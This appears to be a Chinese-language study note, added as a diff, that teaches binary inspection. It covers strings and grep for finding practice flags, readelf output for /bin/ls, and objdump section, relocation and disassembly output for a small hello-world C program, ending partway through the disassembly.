+<h2 id="size"><a href="#size" class="headerlink" title="size"></a>size</h2><ul>
+<li>輸入與結果<img src="https://hackmd.io/_uploads/B13RgBwqp.png" alt="image"></li>
+<li>在這個檔案中，總大小為 2806 bytes</li>
+<li>hex（十六進位表示）：af6</li>
+</ul>
+<hr>
+<ul>
+<li>先把檔案下載下來<img src="https://hackmd.io/_uploads/rkWTtzHqp.png" alt="image"></li>
+<li>輸入<code>git clone https://github.com/MyFirstSecurity2020/DATA202401.git</code><img src="https://hackmd.io/_uploads/Hkzy5Mr9T.png" alt="image"></li>
+</ul>
+<h2 id="DATA202401"><a href="#DATA202401" class="headerlink" title="DATA202401"></a><a target="_blank" rel="noopener" href="https://github.com/MyFirstSecurity2020/DATA202401">DATA202401</a></h2><h3 id="DAY1"><a href="#DAY1" class="headerlink" title="DAY1"></a>DAY1</h3><h4 id="hexedit"><a href="#hexedit" class="headerlink" title="hexedit"></a>hexedit</h4><ul>
+<li>直接先把檔案打開，就會看到flag，但這也很考驗眼力<ul>
+<li><img src="https://hackmd.io/_uploads/ByutTWLcp.png" alt="image"></li>
+</ul>
+</li>
+<li>可以用strings 然後在grep出來即可<ul>
+<li><img src="https://hackmd.io/_uploads/HJ-eRZI9T.png" alt="image"></li>
+</ul>
+</li>
+</ul>
+<h4 id="networkingOK-pcap"><a href="#networkingOK-pcap" class="headerlink" title="networkingOK.pcap"></a>networkingOK.pcap</h4><ul>
+<li>也可以使用相同的方式<ul>
+<li><img src="https://hackmd.io/_uploads/ryzLC-8qp.png" alt="image"></li>
+</ul>
+</li>
+</ul>
+<hr>
+<hr>
+<h1 id="readelf"><a href="#readelf" class="headerlink" title="readelf"></a>readelf</h1><ul>
+<li><p>顯示 &#x2F;bin&#x2F;ls 二進位檔案的 <code>ELF 表頭(ELF Header)</code> &#x3D;&#x3D;&gt; readelf -h &#x2F;bin&#x2F;ls<img src="https://hackmd.io/_uploads/r18mtrPca.png" alt="image"></p>
+</li>
+<li><p>顯示Section Headers (-S 大寫) &#x3D;&#x3D;&gt; readelf -S &#x2F;bin&#x2F;ls</p>
+<ul>
+<li>此選項顯示有關 ELF 檔案中每個sections的詳細資訊。節標題包括名稱(Name)、類型(Type)、地址(Address)、大小和其他屬性。<img src="https://hackmd.io/_uploads/SkKxqSP56.png" alt="image"></li>
+<li>完整結果<br>                                                                              <code> There are 28 section headers, starting at offset 0x1e428:</code></li>
+</ul>
+<pre><code class="txt">Section Headers:
+  [Nr] Name              Type             Address           Offset
+       Size              EntSize          Flags  Link  Info  Align
+  [ 0]                   NULL             0000000000000000  00000000
+       0000000000000000  0000000000000000           0     0     0
+  [ 1] .interp           PROGBITS         0000000000000238  00000238
+       000000000000001b  0000000000000000   A       0     0     1
+  [ 2] .note.gnu.bu[...] NOTE             0000000000000254  00000254
+       0000000000000024  0000000000000000   A       0     0     4
+  [ 3] .note.ABI-tag     NOTE             0000000000000278  00000278
+       0000000000000020  0000000000000000   A       0     0     4
+  [ 4] .gnu.hash         GNU_HASH         0000000000000298  00000298
+       0000000000000040  0000000000000000   A       5     0     8
+  [ 5] .dynsym           DYNSYM           00000000000002d8  000002d8
+       0000000000000bb8  0000000000000018   A       6     3     8
+  [ 6] .dynstr           STRTAB           0000000000000e90  00000e90
+       000000000000058f  0000000000000000   A       0     0     1
+  [ 7] .gnu.version      VERSYM           0000000000001420  00001420
+       00000000000000fa  0000000000000002   A       5     0     2
+  [ 8] .gnu.version_r    VERNEED          0000000000001520  00001520
+       0000000000000090  0000000000000000   A       6     3     8
+  [ 9] .rela.dyn         RELA             00000000000015b0  000015b0
+       0000000000001560  0000000000000018   A       5     0     8
+  [10] .rela.plt         RELA             0000000000002b10  00002b10
+       00000000000009c0  0000000000000018  AI       5    22     8
+  [11] .init             PROGBITS         00000000000034d0  000034d0
+       0000000000000018  0000000000000000  AX       0     0     4
+  [12] .plt              PROGBITS         00000000000034f0  000034f0
+       00000000000006a0  0000000000000000  AX       0     0     16
+  [13] .text             PROGBITS         0000000000003bc0  00003bc0
+       0000000000012640  0000000000000000  AX       0     0     64
+  [14] .fini             PROGBITS         0000000000016200  00016200
+       0000000000000014  0000000000000000  AX       0     0     4
+  [15] .rodata           PROGBITS         0000000000016220  00016220
+       000000000000487a  0000000000000000   A       0     0     16
+  [16] .eh_frame_hdr     PROGBITS         000000000001aa9c  0001aa9c
+       0000000000000564  0000000000000000   A       0     0     4
+  [17] .eh_frame         PROGBITS         000000000001b000  0001b000
+       0000000000002000  0000000000000000   A       0     0     8
+  [18] .init_array       INIT_ARRAY       000000000002d000  0001d000
+       0000000000000008  0000000000000008  WA       0     0     8
+  [19] .fini_array       FINI_ARRAY       000000000002d008  0001d008
+       0000000000000008  0000000000000008  WA       0     0     8
+  [20] .data.rel.ro      PROGBITS         000000000002d010  0001d010
+       0000000000000a08  0000000000000000  WA       0     0     8
+  [21] .dynamic          DYNAMIC          000000000002da18  0001da18
+       0000000000000210  0000000000000010  WA       6     0     8
+  [22] .got              PROGBITS         000000000002dc28  0001dc28
+       00000000000003d8  0000000000000008  WA       0     0     8
+  [23] .data             PROGBITS         000000000002e000  0001e000
+       0000000000000298  0000000000000000  WA       0     0     8
+  [24] .bss              NOBITS           000000000002e298  0001e298
+       00000000000012a8  0000000000000000  WA       0     0     8
+  [25] .gnu_debugaltlink PROGBITS         0000000000000000  0001e298
+       000000000000004a  0000000000000000           0     0     1
+  [26] .gnu_debuglink    PROGBITS         0000000000000000  0001e2e4
+       0000000000000034  0000000000000000           0     0     4
+  [27] .shstrtab         STRTAB           0000000000000000  0001e318
+       000000000000010f  0000000000000000           0     0     1
+Key to Flags:
+  W (write), A (alloc), X (execute), M (merge), S (strings), I (info),
+  L (link order), O (extra OS processing required), G (group), T (TLS),
+  C (compressed), x (unknown), o (OS specific), E (exclude),
+  D (mbind), p (processor specific)
+</code></pre>
+</li>
+<li><p>顯示符號表 (-s 小寫) &#x3D;&#x3D;&gt; readelf -s &#x2F;bin&#x2F;ls</p>
+<ul>
+<li>符號表包含有關二進位檔案中使用的符號的信息，包括函數和變數。這對於理解程序邏輯非常寶貴。<img src="https://hackmd.io/_uploads/SkKS3SDqp.png" alt="image"></li>
+</ul>
+</li>
+</ul>
+<pre><code class="txt">    Symbol table &#39;.dynsym&#39; contains 125 entries:
+   Num:    Value          Size Type    Bind   Vis      Ndx Name
+     0: 0000000000000000     0 NOTYPE  LOCAL  DEFAULT  UND 
+     1: 00000000000034d0     0 SECTION LOCAL  DEFAULT   11 .init
+     2: 000000000002e000     0 SECTION LOCAL  DEFAULT   23 .data
+     3: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND m[...]@GLIBC_2.17 (2)
+     4: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND memcpy@GLIBC_2.17 (2)
+     5: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND m[...]@GLIBC_2.17 (2)
+     6: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND _exit@GLIBC_2.17 (2)
+     7: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND getcwd@GLIBC_2.17 (2)
+     8: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND f[...]@GLIBC_2.17 (2)
+     9: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND strlen@GLIBC_2.17 (2)
+    10: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND _[...]@GLIBC_2.17 (2)
+    11: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND m[...]@GLIBC_2.17 (2)
+    12: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND exit@GLIBC_2.17 (2)
+    13: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND _[...]@GLIBC_2.17 (2)
+    14: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND raise@GLIBC_2.17 (2)
+    15: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND _[...]@GLIBC_2.34 (3)
+    16: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND error@GLIBC_2.17 (2)
+    17: 0000000000000000     0 OBJECT  GLOBAL DEFAULT  UND p[...]@GLIBC_2.17 (2)
+    18: 0000000000000000     0 NOTYPE  WEAK   DEFAULT  UND _ITM_deregisterT[...]
+    19: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND s[...]@GLIBC_2.17 (2)
+    20: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND l[...]@GLIBC_2.17 (2)
+    21: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND setenv@GLIBC_2.17 (2)
+    22: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND r[...]@GLIBC_2.17 (2)
+    23: 0000000000000000     0 FUNC    WEAK   DEFAULT  UND _[...]@GLIBC_2.17 (2)
+    24: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND o[...]@GLIBC_2.17 (2)
+    25: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND s[...]@GLIBC_2.17 (2)
+    26: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND _[...]@GLIBC_2.17 (2)
+    27: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND i[...]@GLIBC_2.17 (2)
+    28: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND c[...]@GLIBC_2.17 (2)
+    29: 0000000000000000     0 OBJECT  GLOBAL DEFAULT  UND stderr@GLIBC_2.17 (2)
+    30: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND lseek@GLIBC_2.17 (2)
+    31: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND _[...]@GLIBC_2.17 (2)
+    32: 0000000000000000     0 OBJECT  GLOBAL DEFAULT  UND optarg@GLIBC_2.17 (2)
+    33: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND _[...]@GLIBC_2.17 (2)
+    34: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND s[...]@GLIBC_2.17 (2)
+    35: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND l[...]@GLIBC_2.17 (2)
+    36: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND fileno@GLIBC_2.17 (2)
+    37: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND _[...]@GLIBC_2.17 (2)
+    38: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND signal@GLIBC_2.17 (2)
+    39: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND _[...]@GLIBC_2.17 (2)
+    40: 0000000000000000     0 OBJECT  GLOBAL DEFAULT  UND _[...]@GLIBC_2.17 (2)
+    41: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND fclose@GLIBC_2.17 (2)
+    42: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND n[...]@GLIBC_2.17 (2)
+    43: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND malloc@GLIBC_2.17 (2)
+    44: 0000000000000000     0 OBJECT  GLOBAL DEFAULT  UND optind@GLIBC_2.17 (2)
+    45: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND [...]@LIBSELINUX_1.0 (4)
+    46: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND w[...]@GLIBC_2.17 (2)
+    47: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND tzset@GLIBC_2.17 (2)
+    48: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND w[...]@GLIBC_2.17 (2)
+    49: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND s[...]@GLIBC_2.17 (2)
+    50: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND s[...]@GLIBC_2.17 (2)
+    51: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND b[...]@GLIBC_2.17 (2)
+    52: 0000000000000000     0 OBJECT  GLOBAL DEFAULT  UND stdout@GLIBC_2.17 (2)
+    53: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND _[...]@GLIBC_2.17 (2)
+    54: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND memset@GLIBC_2.17 (2)
+    55: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND g[...]@GLIBC_2.17 (2)
+    56: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND calloc@GLIBC_2.17 (2)
+    57: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND lstat@GLIBC_2.33 (5)
+    58: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND r[...]@GLIBC_2.17 (2)
+    59: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND r[...]@GLIBC_2.17 (2)
+    60: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND _[...]@GLIBC_2.17 (2)
+    61: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND c[...]@GLIBC_2.17 (2)
+    62: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND _[...]@GLIBC_2.17 (2)
+    63: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND s[...]@GLIBC_2.17 (2)
+    64: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND s[...]@GLIBC_2.17 (2)
+    65: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND t[...]@GLIBC_2.17 (2)
+    66: 0000000000000000     0 NOTYPE  WEAK   DEFAULT  UND __gmon_start__
+    67: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND mktime@GLIBC_2.17 (2)
+    68: 0000000000000000     0 OBJECT  GLOBAL DEFAULT  UND _[...]@GLIBC_2.17 (6)
+    69: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND s[...]@GLIBC_2.17 (2)
+    70: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND abort@GLIBC_2.17 (2)
+    71: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND m[...]@GLIBC_2.17 (2)
+    72: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND _[...]@GLIBC_2.17 (2)
+    73: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND g[...]@GLIBC_2.17 (2)
+    74: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND memcmp@GLIBC_2.17 (2)
+    75: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND t[...]@GLIBC_2.17 (2)
+    76: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND s[...]@GLIBC_2.17 (2)
+    77: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND g[...]@GLIBC_2.17 (2)
+    78: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND _[...]@GLIBC_2.17 (2)
+    79: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND s[...]@GLIBC_2.17 (2)
+    80: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND strcmp@GLIBC_2.17 (2)
+    81: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND g[...]@GLIBC_2.17 (2)
+    82: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND _[...]@GLIBC_2.17 (2)
+    83: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND fseeko@GLIBC_2.17 (2)
+    84: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND free@GLIBC_2.17 (2)
+    85: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND _[...]@GLIBC_2.17 (2)
+    86: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND strchr@GLIBC_2.17 (2)
+    87: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND statx@GLIBC_2.28 (7)
+    88: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND fwrite@GLIBC_2.17 (2)
+    89: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND f[...]@GLIBC_2.17 (2)
+    90: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND f[...]@GLIBC_2.17 (2)
+    91: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND fflush@GLIBC_2.17 (2)
+    92: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND strcpy@GLIBC_2.17 (2)
+    93: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND dirfd@GLIBC_2.17 (2)
+    94: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND u[...]@GLIBC_2.17 (2)
+    95: 0000000000000000     0 OBJECT  GLOBAL DEFAULT  UND _[...]@GLIBC_2.17 (2)
+    96: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND isatty@GLIBC_2.17 (2)
+    97: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND w[...]@GLIBC_2.17 (2)
+    98: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND g[...]@GLIBC_2.17 (2)
+    99: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND f[...]@GLIBC_2.17 (2)
+   100: 0000000000000000     0 OBJECT  GLOBAL DEFAULT  UND p[...]@GLIBC_2.17 (2)
+   101: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND d[...]@GLIBC_2.17 (2)
+   102: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND f[...]@GLIBC_2.17 (2)
+   103: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND s[...]@GLIBC_2.17 (2)
+   104: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND _[...]@GLIBC_2.17 (2)
+   105: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND _[...]@GLIBC_2.17 (2)
+   106: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND s[...]@GLIBC_2.17 (2)
+   107: 0000000000000000     0 NOTYPE  WEAK   DEFAULT  UND _ITM_registerTMC[...]
+   108: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND [...]@LIBSELINUX_1.0 (4)
+   109: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND i[...]@GLIBC_2.17 (2)
+   110: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND _[...]@GLIBC_2.17 (2)
+   111: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND _[...]@GLIBC_2.17 (2)
+   112: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND [...]@LIBSELINUX_1.0 (4)
+   113: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND getenv@GLIBC_2.17 (2)
+   114: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND g[...]@GLIBC_2.17 (2)
+   115: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND timegm@GLIBC_2.17 (2)
+   116: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND ioctl@GLIBC_2.17 (2)
+   117: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND s[...]@GLIBC_2.17 (2)
+   118: 000000000002e270     8 OBJECT  GLOBAL DEFAULT   23 obstack_alloc_fa[...]
+   119: 000000000000e4c0   336 FUNC    GLOBAL DEFAULT   13 _obstack_newchunk
+   120: 000000000000e4a4    24 FUNC    GLOBAL DEFAULT   13 _obstack_begin_1
+   121: 000000000000ee50    52 FUNC    GLOBAL DEFAULT   13 _obstack_allocated_p
+   122: 000000000000e490    20 FUNC    GLOBAL DEFAULT   13 _obstack_begin
+   123: 000000000000ef30    40 FUNC    GLOBAL DEFAULT   13 _obstack_memory_used
+   124: 000000000000ee84   164 FUNC    GLOBAL DEFAULT   13 _obstack_free
+</code></pre>
+<ul>
+<li><p>顯示動態部分（-d) &#x3D;&#x3D;&gt; readelf -d &#x2F;bin&#x2F;ls</p>
+<ul>
+<li>此選項顯示動態連結訊息，包括共享庫依賴項和版本控制詳細資訊。<img src="https://hackmd.io/_uploads/BkLnnBw9a.png" alt="image"></li>
+</ul>
+</li>
+<li><p>顯示<code>程式表頭program headers</code>（-l） &#x3D;&#x3D;&gt; readelf -l &#x2F;bin&#x2F;ls</p>
+<ul>
+<li>程式頭描述了二進位檔案中段的佈局。此資訊對於理解記憶體映射和可執行檔的載入位址至關重要。<img src="https://hackmd.io/_uploads/rJgRnrwcp.png" alt="image"></li>
+</ul>
+</li>
+<li><p>顯示節標題及其內容 (-x)：此選項顯示特定節內容的十六進位和 ASCII 表示形式。</p>
+<ul>
+<li>例如，要檢查 .text 部分： &#x3D;&#x3D;&gt; readelf -x .text &#x2F;bin&#x2F;ls<img src="https://hackmd.io/_uploads/rk7W6BvcT.png" alt="image">（太多了省略下半部）</li>
+</ul>
+</li>
+<li><p>顯示動態字串表(–dyn-syms) &#x3D;&#x3D;&gt; readelf –dyn-syms &#x2F;bin&#x2F;ls</p>
+<ul>
+<li>此選項列印動態符號，這對於動態連結分析至關重要。<img src="https://hackmd.io/_uploads/S1yraHw96.png" alt="image">（太多了省略下半部）</li>
+</ul>
+</li>
+</ul>
+<hr>
+<h1 id="Linux-執行檔分析-objdump"><a href="#Linux-執行檔分析-objdump" class="headerlink" title="Linux 執行檔分析_objdump"></a>Linux 執行檔分析_objdump</h1><h2 id="1-ELF-分析"><a href="#1-ELF-分析" class="headerlink" title="1.ELF 分析"></a>1.ELF 分析</h2><ul>
+<li>指令參數</li>
+</ul>
+<pre><code class="=">-h	顯示區段頭section headers
+-g	顯示除錯資訊
+-l	顯示行號資訊
+-p	顯示專有檔頭資訊，具體內容取決於檔案格式
+-f	顯示檔案檔頭
+-r 	顯示重定資訊
+-R 	顯示動態連結重定資訊
+-s 	顯示檔案所有內容
+-W	顯示檔案中包含有DWARF 除錯資訊格式的區段
+-t	顯示檔案的符號表
+-T 	顯示動態連結符號表
+-x 	顯示檔案的所有檔頭 --all header
+</code></pre>
+<ul>
+<li>範例程式<pre><code class="c++">//PLAYGROUND.c
+#include &lt;stdio.h&gt;
+int main()&#123;
+   printf(&quot;Wu YiHung\n&quot;);
+   return 0;
+&#125;
+</code></pre>
+</li>
+<li>編譯指令 <code>gcc -o PLAYGROUND PLAYGROUND.c -g</code></li>
+<li>顯示區段頭section headers(-h)&#x3D;&#x3D;&gt;<code>objdump -h PLAYGROUND</code></li>
+<li>結果<img src="https://hackmd.io/_uploads/rks4kLwcp.png" alt="image"><ul>
+<li>可以從最上面的數據得知，這是由arm架構編譯的</li>
+</ul>
+</li>
+<li>完整結果</li>
+</ul>
+<pre><code class="txt">PLAYGROUND:     file format elf64-littleaarch64
+
+Sections:
+Idx Name          Size      VMA               LMA               File off  Algn
+0 .interp       0000001b  0000000000000238  0000000000000238  00000238  2**0
+              CONTENTS, ALLOC, LOAD, READONLY, DATA
+1 .note.gnu.build-id 00000024  0000000000000254  0000000000000254  00000254  2**2
+              CONTENTS, ALLOC, LOAD, READONLY, DATA
+2 .note.ABI-tag 00000020  0000000000000278  0000000000000278  00000278  2**2
+              CONTENTS, ALLOC, LOAD, READONLY, DATA
+3 .gnu.hash     0000001c  0000000000000298  0000000000000298  00000298  2**3
+              CONTENTS, ALLOC, LOAD, READONLY, DATA
+4 .dynsym       000000f0  00000000000002b8  00000000000002b8  000002b8  2**3
+              CONTENTS, ALLOC, LOAD, READONLY, DATA
+5 .dynstr       00000092  00000000000003a8  00000000000003a8  000003a8  2**0
+              CONTENTS, ALLOC, LOAD, READONLY, DATA
+6 .gnu.version  00000014  000000000000043a  000000000000043a  0000043a  2**1
+              CONTENTS, ALLOC, LOAD, READONLY, DATA
+7 .gnu.version_r 00000030  0000000000000450  0000000000000450  00000450  2**3
+              CONTENTS, ALLOC, LOAD, READONLY, DATA
+8 .rela.dyn     000000c0  0000000000000480  0000000000000480  00000480  2**3
+              CONTENTS, ALLOC, LOAD, READONLY, DATA
+9 .rela.plt     00000078  0000000000000540  0000000000000540  00000540  2**3
+              CONTENTS, ALLOC, LOAD, READONLY, DATA
+10 .init         00000018  00000000000005b8  00000000000005b8  000005b8  2**2
+              CONTENTS, ALLOC, LOAD, READONLY, CODE
+11 .plt          00000070  00000000000005d0  00000000000005d0  000005d0  2**4
+              CONTENTS, ALLOC, LOAD, READONLY, CODE
+12 .text         00000134  0000000000000640  0000000000000640  00000640  2**6
+              CONTENTS, ALLOC, LOAD, READONLY, CODE
+13 .fini         00000014  0000000000000774  0000000000000774  00000774  2**2
+              CONTENTS, ALLOC, LOAD, READONLY, CODE
+14 .rodata       00000012  0000000000000788  0000000000000788  00000788  2**3
+              CONTENTS, ALLOC, LOAD, READONLY, DATA
+15 .eh_frame_hdr 0000003c  000000000000079c  000000000000079c  0000079c  2**2
+              CONTENTS, ALLOC, LOAD, READONLY, DATA
+16 .eh_frame     000000ac  00000000000007d8  00000000000007d8  000007d8  2**3
+              CONTENTS, ALLOC, LOAD, READONLY, DATA
+17 .init_array   00000008  0000000000010d90  0000000000010d90  00000d90  2**3
+              CONTENTS, ALLOC, LOAD, DATA
+18 .fini_array   00000008  0000000000010d98  0000000000010d98  00000d98  2**3
+              CONTENTS, ALLOC, LOAD, DATA
+19 .dynamic      000001f0  0000000000010da0  0000000000010da0  00000da0  2**3
+              CONTENTS, ALLOC, LOAD, DATA
+20 .got          00000070  0000000000010f90  0000000000010f90  00000f90  2**3
+              CONTENTS, ALLOC, LOAD, DATA
+21 .data         00000010  0000000000011000  0000000000011000  00001000  2**3
+              CONTENTS, ALLOC, LOAD, DATA
+22 .bss          00000008  0000000000011010  0000000000011010  00001010  2**0
+              ALLOC
+23 .comment      0000002b  0000000000000000  0000000000000000  00001010  2**0
+              CONTENTS, READONLY
+24 .debug_aranges 00000030  0000000000000000  0000000000000000  0000103b  2**0
+              CONTENTS, READONLY, DEBUGGING, OCTETS
+25 .debug_info   0000008c  0000000000000000  0000000000000000  0000106b  2**0
+              CONTENTS, READONLY, DEBUGGING, OCTETS
+26 .debug_abbrev 00000043  0000000000000000  0000000000000000  000010f7  2**0
+              CONTENTS, READONLY, DEBUGGING, OCTETS
+27 .debug_line   00000052  0000000000000000  0000000000000000  0000113a  2**0
+              CONTENTS, READONLY, DEBUGGING, OCTETS
+28 .debug_str    000000c7  0000000000000000  0000000000000000  0000118c  2**0
+              CONTENTS, READONLY, DEBUGGING, OCTETS
+29 .debug_line_str 00000023  0000000000000000  0000000000000000  00001253  2**0
+              CONTENTS, READONLY, DEBUGGING, OCTETS
+</code></pre>
+<ul>
+<li>查看重定表(Relocation Table) Examining the Relocation Section &#x3D;&#x3D;&gt; <code>objdump -R PLAYGROUND</code><img src="https://hackmd.io/_uploads/BJJugIw9p.png" alt="image"><pre><code class="txt">PLAYGROUND:     file format elf64-littleaarch64
+
+DYNAMIC RELOCATION RECORDS
+OFFSET           TYPE              VALUE 
+0000000000010d90 R_AARCH64_RELATIVE  *ABS*+0x0000000000000750
+0000000000010d98 R_AARCH64_RELATIVE  *ABS*+0x0000000000000700
+0000000000010ff0 R_AARCH64_RELATIVE  *ABS*+0x0000000000000754
+0000000000011008 R_AARCH64_RELATIVE  *ABS*+0x0000000000011008
+0000000000010fd8 R_AARCH64_GLOB_DAT  _ITM_deregisterTMCloneTable@Base
+0000000000010fe0 R_AARCH64_GLOB_DAT  __cxa_finalize@GLIBC_2.17
+0000000000010fe8 R_AARCH64_GLOB_DAT  __gmon_start__@Base
+0000000000010ff8 R_AARCH64_GLOB_DAT  _ITM_registerTMCloneTable@Base
+0000000000010fa8 R_AARCH64_JUMP_SLOT  __libc_start_main@GLIBC_2.34
+0000000000010fb0 R_AARCH64_JUMP_SLOT  __cxa_finalize@GLIBC_2.17
+0000000000010fb8 R_AARCH64_JUMP_SLOT  __gmon_start__@Base
+0000000000010fc0 R_AARCH64_JUMP_SLOT  abort@GLIBC_2.17
+0000000000010fc8 R_AARCH64_JUMP_SLOT  puts@GLIBC_2.17
+</code></pre>
+</li>
+</ul>
+<hr>
+<h2 id="2-objdump逆向分析"><a href="#2-objdump逆向分析" class="headerlink" title="2.objdump逆向分析"></a>2.objdump逆向分析</h2><ul>
+<li>指令參數</li>
+</ul>
+<pre><code>-d  --disassemble
+    從objfile中對機器指令進行反彙編。本選項只對那些包含指令的section進行反彙編。
+-D  --disassemble-all
+    類似於-d，但是本選項會對所有的sections進行反彙編，而不僅僅是那些包含指令的sections。
+    本選項會微妙的影響程式碼片段的反彙編。當使用-d選項的時候，objdump會假設代碼中出現的所有symbols都在對應
+    的boundary範圍之內，並且不會跨boundary來進行反彙編； 而當使用-D選項時，則並不會有這樣的假設。這就
+    意味著-d與-D選項在反彙編時，可能輸出結果會有些不同，比如當資料存放在程式碼片段的情況下。
+-S 顯示原始碼和反組譯程式碼(包含－d 參數)
+--prefix-addresses
+    反彙編的時候，顯示每一行的完整位址。這是一種比較老的反彙編格式
+</code></pre>
+<h3 id="範例1"><a href="#範例1" class="headerlink" title="範例1"></a>範例1</h3><ul>
+<li>編譯 <code>gcc -o PLAYGROUND PLAYGROUND.c -g</code></li>
+<li>反編譯1(使用att格式) &#x3D;&#x3D;&gt; <code>objdump -S PLAYGROUND</code> (預設:使用AT&amp;T語法) <ul>
+<li>結果1<pre><code class="c++">yih@yih:~/Documents/C$ objdump -S PLAYGROUND
+
+PLAYGROUND:     file format elf64-littleaarch64
+
+
+Disassembly of section .init:
+
+00000000000005b8 &lt;_init&gt;:
+ 5b8:	d503201f 	nop
+ 5bc:	a9bf7bfd 	stp	x29, x30, [sp, #-16]!
+ 5c0:	910003fd 	mov	x29, sp
+ 5c4:	9400002c 	bl	674 &lt;call_weak_fn&gt;
+ 5c8:	a8c17bfd 	ldp	x29, x30, [sp], #16
+ 5cc:	d65f03c0 	ret
+
+Disassembly of section .plt:
+
+00000000000005d0 &lt;.plt&gt;:
+ 5d0:	a9bf7bf0 	stp	x16, x30, [sp, #-16]!
+ 5d4:	90000090 	adrp	x16, 10000 &lt;__FRAME_END__+0xf780&gt;
+ 5d8:	f947d211 	ldr	x17, [x16, #4000]
+ 5dc:	913e8210 	add	x16, x16, #0xfa0
+ 5e0:	d61f0220 	br	x17
+ 5e4:	d503201f 	nop
+ 5e8:	d503201f 	nop
+ 5ec:	d503201f 	nop
+
